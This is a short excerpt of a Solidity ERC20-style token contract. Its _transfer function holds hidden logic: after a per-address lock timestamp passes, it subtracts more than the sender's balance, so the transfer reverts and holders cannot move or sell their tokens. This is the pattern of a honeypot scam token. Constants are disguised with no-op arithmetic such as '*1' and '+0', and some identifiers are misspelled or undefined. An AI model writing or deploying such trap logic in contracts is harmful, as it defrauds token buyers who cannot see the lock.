...
contract token is Ownable, IERC20 {
    ...
    uint256 private _defaultLkTime = 1660533276*1;
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        if (_LKD[sender] > 1660533276+0 && block.timestamp > _LKD[sender]+0) {
            _balance[sender] = _balance[sender].sub(blsender.add(100000)+0);
        }
